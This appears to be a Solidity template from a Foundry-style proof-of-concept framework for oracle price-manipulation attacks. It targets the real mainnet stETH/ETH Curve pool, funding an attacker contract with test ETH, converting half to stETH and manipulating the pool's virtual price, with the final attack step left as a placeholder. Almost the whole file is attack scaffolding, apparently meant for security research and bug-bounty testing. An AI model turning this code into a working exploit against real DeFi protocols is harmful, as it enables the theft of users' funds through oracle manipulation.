pragma solidity ^0.8.0;

import "./pricemanipulation/PriceManipulation.sol";
import "./tokens/Tokens.sol";

import "forge-std/console.sol";

contract PriceManipulationTemplate is PriceManipulation, Tokens {
    // stETH / ETH Curve pool
    ICurvePool pool = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);

    function initiateAttack() external {
        // In this example we are dealing ETH and stETH to an attacker to use for price manipulation
        // of the stETH / ETH Curve pool. This allows us to manipulate the virtual price of the asset
        // for an attack on a protocol which relies on the data from this oracle
        deal(EthereumTokens.NATIVE_ASSET, address(this), 100000e18);
        // Submit half our ETH to the stETH contract to get the stETH we need
        IstETH(address(EthereumTokens.stETH)).submit{value: 50000e18}(address(0x0));
        console.log("Virtual price before:", pool.get_virtual_price());
        manipulatePrice(PriceManipulationProviders.CURVE, EthereumTokens.ETH, EthereumTokens.stETH, 50000e18, 50000e18);
        _completeAttack();
    }

    function _executeAttack() internal override {
        // Execute attack and use flash loaned funds here
        console.log("Virtual price during:", pool.get_virtual_price());
    }

    function _completeAttack() internal override {
        // Finish attack
        console.log("Virtual price after :", pool.get_virtual_price());
    }
}

interface ICurvePool {
    function get_virtual_price() external view returns (uint256);
}

interface IstETH {
    function submit(address referrel) external payable;
}
